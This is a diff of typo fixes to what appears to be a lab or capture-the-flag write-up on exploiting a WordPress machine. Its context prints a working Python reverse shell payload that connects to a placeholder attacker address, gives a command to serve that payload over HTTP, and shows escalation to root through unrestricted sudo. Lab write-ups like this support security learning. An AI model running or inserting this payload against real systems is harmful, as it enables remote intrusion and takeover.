@@ -27,7 +27,7 @@ Googling about it I found [this](https://wpscan.com/vulnerability/9259) on wpsca
 
 ![](images/vuln.png)        
 
-From the looksof it we can send any command so I thought of sending a python reverse shell.     
+From the looks of it we can send any command so I thought of sending a python reverse shell.     
 
 You can find reverse-shells at [PayloadsAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
@@ -35,9 +35,9 @@ Here's the one for python
 ```
 <pre>system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip_address",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\'')</pre>
 ```
-put the above code in a payload.txt on your local directory and host a pythin server from there using the command       
+put the above code in a payload.txt on your local directory and host a python server from there using the command       
 
-Don't forget to add replace with your ipaddress and port
+Don't forget to add replace with your ip_address and port
 ```
 $ python3 -m http.server port
 ```
@@ -57,6 +57,7 @@ $ su takis
 ```
 
 The authentication was taking a bit of time for me, so I thought of connecting through SSH.         
+It worked!!     
 
 First we check the permissions of user takis            
 ```
@@ -68,7 +69,7 @@ User takis may run the following commands on wpwn:
     (ALL) NOPASSWD: ALL
 
 ```
-We can run all commands so we just switch to root using         
+We can run all commands, so we just switch to root using         
 ```
 $ sudo su
 ```
